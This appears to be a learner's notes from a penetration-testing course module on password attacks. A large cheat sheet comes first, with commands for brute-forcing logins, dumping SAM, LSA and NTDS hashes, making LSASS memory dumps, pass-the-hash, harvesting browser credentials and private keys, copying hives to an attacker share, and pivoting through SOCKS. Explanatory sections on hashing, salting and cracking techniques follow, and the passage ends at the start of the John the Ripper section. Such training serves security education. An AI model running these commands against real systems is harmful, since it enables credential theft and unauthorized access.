
<body>
  <div class="container">
<link rel="stylesheet" href="style.css">


<h1 id="8-password-attacks">8. Password attacks</h1>
<h2 id="cheat-sheet">Cheat Sheet</h2>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>xfreerdp /v:&lt;ip&gt; /u:htb-student /p:HTB_@cademy_stdnt!</code></td>
<td>CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol.</td>
</tr>
<tr>
<td><code>evil-winrm -i &lt;ip&gt; -u user -p password</code></td>
<td>Uses Evil-WinRM to establish a Powershell session with a target.</td>
</tr>
<tr>
<td><code>ssh user@&lt;ip&gt;</code></td>
<td>Uses SSH to connect to a target using a specified user.</td>
</tr>
<tr>
<td><code>smbclient -U user \\\\&lt;ip&gt;\\SHARENAME</code></td>
<td>Uses smbclient to connect to an SMB share using a specified user.</td>
</tr>
<tr>
<td><code>python3 smbserver.py -smb2support CompData /home/&lt;nameofuser&gt;/Documents/</code></td>
<td>Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="password-mutations-custom-wordlists">Password Mutations &amp; Custom Wordlists</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist</code></td>
<td>Uses cewl to generate a wordlist based on keywords present on a website.</td>
</tr>
<tr>
<td><code>hashcat --force password.list -r custom.rule --stdout &gt; mut_password.list</code></td>
<td>Uses Hashcat to generate a rule-based word list.</td>
</tr>
<tr>
<td><code>./username-anarchy -i /path/to/listoffirstandlastnames.txt</code></td>
<td>Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.</td>
</tr>
<tr>
<td>`curl -s <a href="https://fileinfo.com/filetypes/compressed">https://fileinfo.com/filetypes/compressed</a> \</td>
<td>html2text \</td>
<td>awk &#39;{print tolower($1)}&#39; \</td>
<td>grep &quot;.&quot; \</td>
<td>tee -a compressed_ext.txt`</td>
<td>Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="remote-password-attacks">Remote Password Attacks</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>netexec winrm &lt;ip&gt; -u user.list -p password.list</code></td>
<td>Uses Netexec over WinRM to attempt to brute force user names and passwords specified hosted on a target.</td>
</tr>
<tr>
<td><code>netexec smb &lt;ip&gt; -u &quot;user&quot; -p &quot;password&quot; --shares</code></td>
<td>Uses Netexec to enumerate smb shares on a target using a specified set of credentials.</td>
</tr>
<tr>
<td><code>hydra -L user.list -P password.list &lt;service&gt;://&lt;ip&gt;</code></td>
<td>Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.</td>
</tr>
<tr>
<td><code>hydra -l username -P password.list &lt;service&gt;://&lt;ip&gt;</code></td>
<td>Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service.</td>
</tr>
<tr>
<td><code>hydra -L user.list -p password &lt;service&gt;://&lt;ip&gt;</code></td>
<td>Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service.</td>
</tr>
<tr>
<td><code>hydra -C &lt;user_pass.list&gt; ssh://&lt;IP&gt;</code></td>
<td>Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack.</td>
</tr>
<tr>
<td><code>netexec smb &lt;ip&gt; --local-auth -u &lt;username&gt; -p &lt;password&gt; --sam</code></td>
<td>Uses Netexec in conjunction with admin credentials to dump password hashes stored in SAM, over the network.</td>
</tr>
<tr>
<td><code>netexec smb &lt;ip&gt; --local-auth -u &lt;username&gt; -p &lt;password&gt; --lsa</code></td>
<td>Uses Netexec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way.</td>
</tr>
<tr>
<td><code>netexec smb &lt;ip&gt; -u &lt;username&gt; -p &lt;password&gt; --ntds</code></td>
<td>Uses Netexec in conjunction with admin credentials to dump hashes from the ntds file over a network.</td>
</tr>
<tr>
<td><code>evil-winrm -i &lt;ip&gt; -u Administrator -H &quot;&lt;passwordhash&gt;&quot;</code></td>
<td>Uses Evil-WinRM to establish a Powershell session with a Windows target using a user and password hash. This is one type of <code>Pass-The-Hash</code> attack.</td>
</tr>
<tr>
<td><code>./Pcredz -f demo.pcapng -t -v</code></td>
<td>Extract credentials a network packet capture</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="windows-local-password-attacks">Windows Local Password Attacks</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>tasklist /svc</code></td>
<td>A command-line-based utility in Windows used to list running processes.</td>
</tr>
<tr>
<td><code>findstr /SIM /C:&quot;password&quot; *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</code></td>
<td>Uses Windows command-line based utility findstr to search for the string &quot;password&quot; in many different file type.</td>
</tr>
<tr>
<td><code>Get-Process lsass</code></td>
<td>A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.</td>
</tr>
<tr>
<td><code>rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full</code></td>
<td>Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials.</td>
</tr>
<tr>
<td><code>pypykatz lsa minidump /path/to/lsassdumpfile</code></td>
<td>Uses Pypykatz to parse and attempt to extract credentials &amp; password hashes from an LSASS process memory dump file.</td>
</tr>
<tr>
<td><code>reg.exe save hklm\sam C:\sam.save</code></td>
<td>Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system).</td>
</tr>
<tr>
<td><code>move sam.save \\&lt;ip&gt;\NameofFileShare</code></td>
<td>Uses move in Windows to transfer a file to a specified file share over the network.</td>
</tr>
<tr>
<td><code>python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</code></td>
<td>Uses Secretsdump.py to dump password hashes from the SAM database.</td>
</tr>
<tr>
<td><code>vssadmin CREATE SHADOW /For=C:</code></td>
<td>Uses Windows command line based tool vssadmin to create a volume shadow copy for <code>C:</code>. This can be used to make a copy of NTDS.dit safely.</td>
</tr>
<tr>
<td><code>cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit</code></td>
<td>Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of <code>C:</code>.</td>
</tr>
<tr>
<td><code>rundll32 keymgr.dll,KRShowKeyMgr</code></td>
<td>Access the Credential Manager prompt to backup or restore saved credentials</td>
</tr>
<tr>
<td><code>cmdkey /list</code></td>
<td>Enumerate credentials stored in the current user&#39;s profile</td>
</tr>
<tr>
<td><code>runas /savecred /user:&lt;username&gt; cmd</code></td>
<td>Launch a new instance of cmd.exe while impersonating a stored user.</td>
</tr>
<tr>
<td><code>snaffler.exe -s</code></td>
<td>Search network shares for interesting files and credentials</td>
</tr>
<tr>
<td><code>Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public</code></td>
<td>Search network shares for interesting files and save the results.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="linux-local-password-attacks">Linux Local Password Attacks</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>`for l in $(echo &quot;.conf .config .cnf&quot;);do echo -e &quot;\nFile extension: &quot; $l; find / -name *$l 2&gt;/dev/null \</td>
<td>grep -v &quot;lib\</td>
<td>fonts\</td>
<td>share\</td>
<td>core&quot; ;done`</td>
<td>Script that can be used to find .conf, .config and .cnf files on a Linux system.</td>
</tr>
<tr>
<td>`for i in $(find / -name *.cnf 2&gt;/dev/null \</td>
<td>grep -v &quot;doc\</td>
<td>lib&quot;);do echo -e &quot;\nFile: &quot; $i; grep &quot;user\</td>
<td>password\</td>
<td>pass&quot; $i 2&gt;/dev/null \</td>
<td>grep -v &quot;#&quot;;done`</td>
<td>Script that can be used to find credentials in specified file types.</td>
</tr>
<tr>
<td>`for l in $(echo &quot;.sql .db .<em>db .db</em>&quot;);do echo -e &quot;\nDB File extension: &quot; $l; find / -name *$l 2&gt;/dev/null \</td>
<td>grep -v &quot;doc\</td>
<td>lib\</td>
<td>headers\</td>
<td>share\</td>
<td>man&quot;;done`</td>
<td>Script that can be used to find common database files.</td>
</tr>
<tr>
<td><code>find /home/* -type f -name &quot;*.txt&quot; -o ! -name &quot;*.*&quot;</code></td>
<td>Uses Linux-based find command to search for text files.</td>
</tr>
<tr>
<td>`for l in $(echo &quot;.py .pyc .pl .go .jar .c .sh&quot;);do echo -e &quot;\nFile extension: &quot; $l; find / -name *$l 2&gt;/dev/null \</td>
<td>grep -v &quot;doc\</td>
<td>lib\</td>
<td>headers\</td>
<td>share&quot;;done`</td>
<td>Script that can be used to search for common file types used with scripts.</td>
</tr>
<tr>
<td>`for ext in $(echo &quot;.xls .xls<em> .xltx .csv .od</em> .doc .doc<em> .pdf .pot .pot</em> .pp<em>&quot;);do echo -e &quot;\nFile extension: &quot; $ext; find / -name </em>$ext 2&gt;/dev/null \</td>
<td>grep -v &quot;lib\</td>
<td>fonts\</td>
<td>share\</td>
<td>core&quot; ;done`</td>
<td>Script used to look for common types of documents.</td>
</tr>
<tr>
<td><code>cat /etc/crontab</code></td>
<td>Uses Linux-based cat command to view the contents of crontab in search for credentials.</td>
</tr>
<tr>
<td><code>ls -la /etc/cron.*/</code></td>
<td>Uses Linux-based ls -la command to list all files that start with <code>cron</code> contained in the etc directory.</td>
</tr>
<tr>
<td>`grep -rnw &quot;PRIVATE KEY&quot; /* 2&gt;/dev/null \</td>
<td>grep &quot;:1&quot;`</td>
<td>Uses Linux-based command grep to search the file system for key terms <code>PRIVATE KEY</code> to discover SSH keys.</td>
</tr>
<tr>
<td>`grep -rnw &quot;PRIVATE KEY&quot; /home/* 2&gt;/dev/null \</td>
<td>grep &quot;:1&quot;`</td>
<td>Uses Linux-based grep command to search for the keywords <code>PRIVATE KEY</code> within files contained in a user&#39;s home directory.</td>
</tr>
<tr>
<td>`grep -rnw &quot;ssh-rsa&quot; /home/* 2&gt;/dev/null \</td>
<td>grep &quot;:1&quot;`</td>
<td>Uses Linux-based grep command to search for keywords <code>ssh-rsa</code> within files contained in a user&#39;s home directory.</td>
</tr>
<tr>
<td><code>tail -n5 /home/*/.bash*</code></td>
<td>Uses Linux-based tail command to search the through bash history files and output the last 5 lines.</td>
</tr>
<tr>
<td><code>python3 mimipenguin.py</code></td>
<td>Runs Mimipenguin.py using python3.</td>
</tr>
<tr>
<td><code>bash mimipenguin.sh</code></td>
<td>Runs Mimipenguin.sh using bash.</td>
</tr>
<tr>
<td><code>python2.7 lazagne.py all</code></td>
<td>Runs Lazagne.py with all modules using python2.7</td>
</tr>
<tr>
<td>`ls -l .mozilla/firefox/ \</td>
<td>grep default`</td>
<td>Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword <code>default</code> using grep.</td>
</tr>
<tr>
<td>`cat .mozilla/firefox/1bplpd86.default-release/logins.json \</td>
<td>jq .`</td>
<td>Uses Linux-based command cat to search for credentials stored by Firefox in JSON.</td>
</tr>
<tr>
<td><code>python3.9 firefox_decrypt.py</code></td>
<td>Runs Firefox_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9.</td>
</tr>
<tr>
<td><code>python3 lazagne.py browsers</code></td>
<td>Runs Lazagne.py browsers module using Python 3.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="cracking-passwords">Cracking Passwords</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt</code></td>
<td>Uses Hashcat to crack NTLM hashes using a specified wordlist.</td>
</tr>
<tr>
<td><code>hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show</code></td>
<td>Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output.</td>
</tr>
<tr>
<td><code>unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes</code></td>
<td>Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking.</td>
</tr>
<tr>
<td><code>hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked</code></td>
<td>Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked.</td>
</tr>
<tr>
<td><code>hashcat -m 500 -a 0 md5-hashes.list rockyou.txt</code></td>
<td>Uses Hashcat in conjunction with a word list to crack the md5 hashes in the md5-hashes.list file.</td>
</tr>
<tr>
<td><code>hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked</code></td>
<td>Uses Hashcat to crack the extracted BitLocker hashes using a wordlist and outputs the cracked hashes into a file called backup.cracked.</td>
</tr>
<tr>
<td><code>python3 ssh2john.py SSH.private &gt; ssh.hash</code></td>
<td>Runs ssh2john.py script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash.</td>
</tr>
<tr>
<td><code>john ssh.hash --show</code></td>
<td>Uses John to attempt to crack the hashes in the ssh.hash file, then outputs the results in the terminal.</td>
</tr>
<tr>
<td><code>office2john.py Protected.docx &gt; protected-docx.hash</code></td>
<td>Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.</td>
</tr>
<tr>
<td><code>john --wordlist=rockyou.txt protected-docx.hash</code></td>
<td>Uses John in conjunction with the wordlist rockyou.txt to crack the hash protected-docx.hash.</td>
</tr>
<tr>
<td><code>pdf2john.pl PDF.pdf &gt; pdf.hash</code></td>
<td>Runs Pdf2john.pl script to convert a pdf file to a pdf has to be cracked.</td>
</tr>
<tr>
<td><code>john --wordlist=rockyou.txt pdf.hash</code></td>
<td>Runs John in conjunction with a wordlist to crack a pdf hash.</td>
</tr>
<tr>
<td><code>zip2john ZIP.zip &gt; zip.hash</code></td>
<td>Runs Zip2john against a zip file to generate a hash, then adds that hash to a file called zip.hash.</td>
</tr>
<tr>
<td><code>john --wordlist=rockyou.txt zip.hash</code></td>
<td>Uses John in conjunction with a wordlist to crack the hashes contained in zip.hash.</td>
</tr>
<tr>
<td><code>bitlocker2john -i Backup.vhd &gt; backup.hashes</code></td>
<td>Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes.</td>
</tr>
<tr>
<td><code>file GZIP.gzip</code></td>
<td>Uses the Linux-based file tool to gather file format information.</td>
</tr>
<tr>
<td>`for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2&gt;/dev/null \</td>
<td>tar xz;done`</td>
<td>Script that runs a for-loop to extract files from an archive.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="pivoting">Pivoting</h3>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ssh -D 9050 user@&lt;DMZ01&gt;</code></td>
<td>Establishes a SOCKS proxy on port 9050 via SSH. Once the DMZ01 host is compromised, this allows routing of traffic through the DMZ into the internal network — enabling pivoting to otherwise inaccessible systems.</td>
</tr>
<tr>
<td><code>sudo vim /etc/proxychains.conf</code></td>
<td>Opens the ProxyChains configuration file in Vim. Ensure that the line <code>socks4 127.0.0.1 9050</code> is present under the <code>[ProxyList]</code> section — this defines the local SOCKS proxy (created by SSH) through which traffic will be routed. This entry may already exist but could be commented out.</td>
</tr>
<tr>
<td><code>sudo proxychains -q nmap -sT -Pn 172.16.119.13 --open</code></td>
<td>Performs a TCP scan on an internal host using Nmap. The <code>proxychains</code> prefix routes the scan through the previouly established SOCKS proxy, allowing internal reconnaissance from the attacker&#39;s machine. Note that the <code>-sT</code> option is required when using Nmap with ProxyChains.</td>
</tr>
<tr>
<td><code>proxychains xfreerdp /v:&lt;ip&gt; /u:htb-student /p:HTB_@cademy_stdnt!</code></td>
<td>Launches an RDP session routed through the SOCKS proxy. This is useful for interacting with internal desktops (like domain-joined Windows hosts) when direct network access is not possible.</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="introduction">Introduction</h2>
<p><code>Confidentiality</code>, <code>integrity</code>, and <code>availability</code> are at the core of every infosec practitioner&#39;s responsibilities. Without maintaining a balance among them, we cannot ensure the security of our enterprises. This balance is preserved by auditing and accounting for each file, object, and host in the environment; by validating that users have appropriate permissions (authorization) to access those resources; and by verifying each user&#39;s identity (authentication) before granting access. Most breaches can be traced back to the breakdown of one of these three principles. This module focuses on attacking and bypassing the tenet of <code>authentication</code> by compromising user passwords across various operating systems, applications, and encryption methods. Before diving into the exciting part, <code>attacking passwords</code>, let&#39;s take a moment to discuss authentication and its components.</p>
<h3 id="authentication">Authentication</h3>
<p>Authentication, at its core, is the validation of your identity by presenting a combination of four factors to a validation mechanism. They are:</p>
<ol>
<li><code>Something you know</code>: a password, passcode, pin, etc.</li>
<li><code>Something you have</code>: an ID Card, security key, or other MFA tools</li>
<li><code>Something you are</code>: your physical self, username, email address, or other identifiers</li>
<li><code>Somewhere you are</code>: geolocation, IP address, etc.</li>
</ol>
<p>The process can require any or all of these authentication factors. These methods will be determined based on the severity of the information or systems accessed and how much protection they need. For example, doctors are often required to utilize a Common Access Card (CAC) paired with a pin-code or password to access any terminals that input or store patient data. Depending on the maturity of the organization&#39;s security posture, they could require all three types (A CAC, password, and pin from an authenticator app, for example).</p>
<p>Another simple example of this is access to our email address. The proof of information, in this case, would be the knowledge of the email address itself and the associated password. For example, a cell phone with <code>2FA</code> can be used. The third aspect can also play a role: the user&#39;s presence through biometric recognition such as a fingerprint or facial recognition.</p>
<p>In the previous example, the password is the authentication identifier that can be bypassed with different TTPs. This level is about authenticating the identity. Usually, only the owner and authenticating authority know the password. Authorization is carried out if the correct password is given to the authentication authority. Authorization, in this case, is the set of permissions that the user is granted upon successful authentication.</p>
<h3 id="the-use-of-passwords">The use of passwords</h3>
<p>The most common and widely used authentication method is still the use of passwords. But what is a password? A password or passphrase can be generally defined as <code>a combination of letters, numbers, and symbols in a string for identity validation.</code> For example, if we work with passwords and take a standard 8-digit password that consists only of upper case letters and numbers, we would get a total of <code>36⁸</code> (<code>208,827,064,576</code>) possible passwords.</p>
<p>Realistically, it doesn&#39;t need to be a combination of those things. It could be a lyric from a song or poem, a line from a book, a phrase you can remember, or even randomly generated words concatenated together like &quot;TreeDogEvilElephant.&quot; The key is for it to meet or exceed the security standards in place by your organization. Using multiple layers to establish identity can make the entire authentication process complicated and costly. Adding complexity to the authentication process creates further effort that can add to the stresses and workload a person may have during a typical workday. Complex systems can often require inconvenient manual processes or additional steps that could significantly complicate the interaction and <code>user experience</code> (<code>UX</code>). Consider the process of shopping at an online store. Creating an account on the store website can make the authentication and checkout processes much faster than manually inputting your personal information each time you wish to make a purchase. For this reason, using a username and password to secure an account is the most widespread method of authentication that we will see again and again while keeping in mind this balance of convenience and security.</p>
<p>A <a href="https://web.archive.org/web/20201115110047/https://storage.googleapis.com/gweb-uniblog-publish-prod/documents/PasswordCheckup-HarrisPoll-InfographicFINAL.pdf">survey</a> conducted by Google and Harris Poll in 2019 reveals that <code>24% of Americans</code> have used passwords like <code>123456</code>, <code>qwerty</code> and <code>password</code>. At the time, only <code>15% of Americans</code> used password managers. It is also stated that <code>22%</code> used their <code>name</code>, and <code>33%</code> used the name of their <code>pet</code> or <code>children</code>. Another critical statistic is the <code>password re-use</code> across multiple accounts being <code>66%</code>. This means that 66% of all Americans, according to this statistic, have used the same password for multiple platforms. Therefore, once we have obtained or guessed a password, there is a 66% chance that we could use it to authenticate ourselves on other platforms with the user&#39;s ID (username or email address). This would, of course, require that we are able to guess the user&#39;s user ID, which, in many cases, is not difficult to do.</p>
<p><a href="https://web.archive.org/web/20250405101232/https://www.pandasecurity.com/en/mediacenter/password-statistics/">Statistics</a> compiled by Panda Security in 2025 show that these trends remain similar, with some signs of improvement. <code>123456</code> is still the most common password, appearing <code>4.5 million times</code> in data breaches, and at least <code>23%</code> reuse passwords across three accounts or more. However, <code>36% of Americans</code> have adopted password managers, which is more than double the figure from 6 years prior.</p>
<p>One aspect of Google&#39;s survey that is somewhat more difficult to understand is that only 45% of Americans would change their passwords after a data breach. This, in turn, means that <code>55% still keep the password</code> even though it has already been leaked. We can also check if one of our email addresses is affected by various data breaches. One of the best-known sources for this is <a href="https://haveibeenpwned.com/">HaveIBeenPwned</a>. We enter an email address in the HaveIBeenPwned website, and it checks in its database if the email address has already been affected by any reported data breaches. If this is the case, we will see a list of all of the breaches in which our email address appears.</p>
<h3 id="digging-in">Digging in</h3>
<p>Now that we have defined what a password is, how we use them, and common security principles, let&#39;s dive into how we store passwords and other credentials.</p>
<hr>
<h2 id="introduction-to-password-cracking">Introduction to Password Cracking</h2>
<p>Passwords are commonly <code>hashed</code> when stored, in order to provide some protection in the event they fall into the hands of an attacker. <code>Hashing</code> is a mathematical function which transforms an arbitrary number of input bytes into a (typically) fixed-size output; common examples of hash functions are <code>MD5</code>, and <code>SHA-256</code>.</p>
<p>Take the password <code>Soccer06!</code> for example. The corresponding <code>MD5</code> and <code>SHA-256</code> hashes can be generated with the following commands:</p>
<p>&#x20; Introduction to Password Cracking</p>
<pre><code class="lang-shell-session">bmdyy<span class="hljs-variable">@htb</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>echo -n Soccer06! | md5sum
<span class="hljs-number">40291</span>c1d19ee11a7df8495c4cccefdfa  -

bmdyy<span class="hljs-variable">@htb</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>echo -n Soccer06! | sha256sum
a025dc6fabb09c2b8bfe23b5944635f9b68433ebd9a1a09453dd4fee00766d93  -
</code></pre>
<p>Hash functions are designed to work in <code>one direction</code>. This means it should not be possible to figure out what the original password was based on the hash alone. When attackers attempt to do this, it is called <code>password cracking</code>. Common techniques are to use <code>rainbow tables</code>, to perform <code>dictionary attacks</code>, and typically as a last resort, to perform <code>brute-force attacks</code>.</p>
<h3 id="rainbow-tables">Rainbow tables</h3>
<p>Rainbow tables are large pre-compiled maps of input and output values for a given hash function. These can be used to very quickly identify the password if its corresponding hash has already been mapped.</p>
<table>
<thead>
<tr>
<th>Password</th>
<th>MD5 Hash</th>
</tr>
</thead>
<tbody>
<tr>
<td>123456</td>
<td>e10adc3949ba59abbe56e057f20f883e</td>
</tr>
<tr>
<td>12345</td>
<td>827ccb0eea8a706c4c34a16891f84e7b</td>
</tr>
<tr>
<td>123456789</td>
<td>25f9e794323b453885f5181f1b624d0b</td>
</tr>
<tr>
<td>password</td>
<td>5f4dcc3b5aa765d61d8327deb882cf99</td>
</tr>
<tr>
<td>iloveyou</td>
<td>f25a2fc72690b780b2a14e140ef6a9e0</td>
</tr>
<tr>
<td>princess</td>
<td>8afa847f50a716e64932d995c8e7435a</td>
</tr>
<tr>
<td>1234567</td>
<td>fcea920f7412b5da7be0cf42b8c93759</td>
</tr>
<tr>
<td>rockyou</td>
<td>f806fc5a2a0d5ba2471600758452799c</td>
</tr>
<tr>
<td>12345678</td>
<td>25d55ad283aa400af464c76d713c07ad</td>
</tr>
<tr>
<td>abc123</td>
<td>e99a18c428cb38d5f260853678922e03</td>
</tr>
<tr>
<td>...SNIP...</td>
<td>...SNIP...</td>
</tr>
</tbody>
</table>
<p>Because rainbow tables are such a powerful attack, <code>salting</code> is used. A <code>salt</code>, in cryptographic terms, is a random sequence of bytes added to a password before it is hashed. To maximize impact, salts should not be reused, e.g. for all passwords stored in one database. For example, if the salt <code>Th1sIsTh3S@lt_</code> is prepended to the same password, the MD5 hash would now be as follows:</p>
<p>&#x20; Introduction to Password Cracking</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> echo -n Th1sIsTh3S<span class="hljs-meta">@lt_Soccer06!</span> |<span class="hljs-string"> md5sum

90a10ba83c04e7996bc53373170b5474  -</span>
</code></pre>
<p>A salt is not a secret value — when a system goes to check an authentication request, it needs to know what salt was used so that it can check if the password hash matches. For this reason, salts are typically prepended to corresponding hashes. The reason this technique works against rainbow tables is that even if the correct password has been mapped, the combination of salt and password has likely not (especially if the salt contains non-printable characters). To make rainbow tables effective again, an attacker would need to update their mapping to account for every possible salt. A salt consisting of <code>just one single byte</code> would mean the <code>15 billion</code> entries from before would have to be <code>3.84 trillion</code> (factor of 256).</p>
<h3 id="brute-force-attack">Brute-force attack</h3>
<p>A <code>brute-force</code> attack involves attempting every possible combination of letters, numbers, and symbols until the correct password is discovered. Obviously, this can take a very long time—especially for long passwords—however shorter passwords (&lt;9 characters) are viable targets, even on consumer hardware. Brute-forcing is the only password cracking technique that is <code>100% effective</code> - in that, given enough time, any password will be cracked with this technique. That said, it is hardly ever used because of how much time it takes for stronger passwords, and is typically replaced by much more efficient <code>mask attacks</code>. This is something we will cover in the next couple sections.</p>
<table>
<thead>
<tr>
<th>Brute-force attempt</th>
<th>MD5 Hash</th>
</tr>
</thead>
<tbody>
<tr>
<td>...SNIP...</td>
<td>...SNIP...</td>
</tr>
<tr>
<td>Sxejd</td>
<td>2cdc813ef26e6d20c854adb107279338</td>
</tr>
<tr>
<td>Sxeje</td>
<td>7703349a1f943f9da6d1dfcda51f3b63</td>
</tr>
<tr>
<td>Sxejf</td>
<td>db914f10854b97946046eabab2287178</td>
</tr>
<tr>
<td>Sxejg</td>
<td>c0ceb70c0e0f2c3da94e75ae946f29dc</td>
</tr>
<tr>
<td>Sxejh</td>
<td>4dca0d2b706e9344985d48f95e646ce8</td>
</tr>
<tr>
<td>Sxeji</td>
<td>66b5fa128df895d50b2d70353a7968a7</td>
</tr>
<tr>
<td>Sxejj</td>
<td>dd7097ba514c136caac321e321b1b5ca</td>
</tr>
<tr>
<td>Sxejk</td>
<td>c0eb1193e62a7a57dec2fafd4177f7d9</td>
</tr>
<tr>
<td>Sxejl</td>
<td>5ad8e1282437da255b866d22339d1b53</td>
</tr>
<tr>
<td>Sxejm</td>
<td>c4b95c1fe6d2a4f22620efd54c066664</td>
</tr>
<tr>
<td>...SNIP...</td>
<td>...SNIP...</td>
</tr>
</tbody>
</table>
<p>Note: Brute-forcing speeds depend heavily on the hashing algorithm and hardware that is used. On a typical company laptop, a tool like <code>hashcat</code> might be able to guess over <code>five million</code> passwords per second when attacking MD5, while at the same time only managing <code>ten thousand</code> per second when targeting a DCC2 hash.</p>
<h3 id="dictionary-attack">Dictionary attack</h3>
<p>A <code>dictionary</code> attack, otherwise known as a <code>wordlist</code> attack, is one of the most <code>efficient</code> techniques for cracking passwords, especially when operating under time-constraints as penetration testers usually do. Rather than attempting every possible combination of characters, a list containing statistically likely passwords is used. Well-known wordlists for password cracking are <a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">rockyou.txt</a> and those included in <a href="https://github.com/danielmiessler/SecLists">SecLists</a>.</p>
<p>&#x20; Introduction to Password Cracking</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ head --lines=<span class="hljs-number">20</span> /usr/share/wordlists/rockyou.txt 

<span class="hljs-number">123456</span>
<span class="hljs-number">12345</span>
<span class="hljs-number">123456789</span>
password
iloveyou
princess
<span class="hljs-number">1234567</span>
rockyou
<span class="hljs-number">12345678</span>
abc123
nicole
daniel
babygirl
monkey
lovely
jessica
<span class="hljs-number">654321</span>
michael
ashley
qwerty
</code></pre>
<p>Note: <code>rockyou.txt</code> is a list of over <code>14 million</code> real passwords that were leaked when the <code>RockYou</code> website was hacked in 2009. Surprisingly, the company made the decision to store all user passwords unencrypted!</p>
<hr>
<h2 id="introduction-to-john-the-ripper">Introduction to John The Ripper</h2>
<p><a href="https://github.com/openwall/john">John the Ripper</a> (aka. <code>JtR</code> aka. <code>john</code>) is a well-known penetration testing tool used for cracking passwords through various attacks including brute-force and dictionary. It is open-source software initially developed for UNIX-based systems and was first released in 1996. It has become a staple of the security industry due to its various capabilities. The <code>&quot;jumbo&quot;</code> variant is recommended for our uses, as it has performance optimizations, additional features such as multilingual word lists, and support for 64-bit architectures. This version is able to crack passwords with greater accuracy and speed. Included with JtR are various tools for converting different types of files and hashes into formats that are usable by JtR. Additionally, the software is regularly updated to keep up with the current security trends and technologies.</p>
<h3 id="cracking-modes">Cracking modes</h3>
<p><strong>Single crack mode</strong></p>
<p><code>Single crack mode</code> is a rule-based cracking technique that is most useful when targeting Linux credentials. It generates password candidates based on the victim&#39;s username, home directory name, and <a href="https://en.wikipedia.org/wiki/Gecos_field">GECOS</a> values (full name, room number, phone number, etc.). These strings are run against a large set of rules that apply common string modifications seen in passwords (e.g. a user whose real name is <code>Bob Smith</code> might use <code>Smith1</code> as their password).</p>
<p>Note: The Linux authentication process, as well as cracking rules, will be covered in-depth in later sections. The following example is simplified for demonstration purposes.</p>
<p>Imagine we as attackers came across the file <code>passwd</code> with the following contents:</p>
